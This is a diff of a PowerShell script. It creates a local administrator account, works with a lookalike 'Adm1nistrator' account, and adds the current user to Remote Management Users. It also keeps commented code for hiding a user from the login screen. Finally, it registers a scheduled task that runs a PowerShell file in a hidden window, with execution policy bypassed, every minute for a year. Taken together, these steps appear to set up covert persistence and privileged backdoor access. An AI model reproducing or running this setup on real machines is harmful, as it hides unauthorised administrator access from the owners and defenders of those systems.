@@ -32,18 +32,14 @@ $userExists = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
 
 if (-not $userExists) {
     # Create local user
-    New-LocalUser `
-        -Name $username `
-        -Password $securePassword `
-        -FullName $username `
-        -Description "Local admin account" ``
-        -AccountNeverExpires
+    New-LocalUser -Name $username -Password $securePassword -FullName $username -Description "Local admin account" 
     net user Adm1nistrator /passwordreq:yes
     Set-LocalUser -Name "Adm1nistrator" -PasswordNeverExpires $true
 
     # Add user to Administrators group
     Add-LocalGroupMember -Group "Administrators" -Member $username
-
+    # This is for the current user
+    Add-LocalGroupMember -Group "Remote Management Users" -Member $env:USERNAME
 
     # # Hide user from login screen
     # $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
@@ -99,13 +95,13 @@ if (-not $taskExists) {
     $action = New-ScheduledTaskAction `
         -Execute "powershell.exe" `
         -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`""
-    
+
     $trigger = New-ScheduledTaskTrigger `
         -Once `
         -At (Get-Date) `
         -RepetitionInterval (New-TimeSpan -Minutes 1) `
         -RepetitionDuration (New-TimeSpan -Days 365)
-    
+
     Register-ScheduledTask `
         -TaskName $taskName `
         -Action $action `
